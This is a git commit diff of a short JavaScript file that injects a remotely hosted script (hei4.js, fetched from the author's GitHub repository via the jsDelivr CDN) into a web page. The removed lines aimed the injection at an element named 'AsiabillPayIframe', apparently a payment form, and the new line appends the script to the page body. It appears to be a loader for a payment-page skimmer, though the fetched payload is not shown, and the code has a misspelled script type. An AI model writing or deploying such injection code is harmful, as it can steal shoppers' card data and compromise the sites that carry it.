d6b61a17335eed0e214b044fcc5166bcea7794ab
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-06-30 16:46:43 +0800

    Update and rename ha4.js to ha5.js

--- ha5.js
+++ ha5.js
@@ -2,6 +2,5 @@
      scriptEle.type = "text/javasctipt";
      scriptEle.async = true;
      scriptEle.src = "https://cdn.jsdelivr.net/gh/xjjkong/haha@main/hei4.js";
-     var x = document.getElementById("AsiabillPayIframe")[0];
-     x.insertBefore(scriptEle, x.firstChild);
+     document.body.appendChild(scriptEle);
  })();
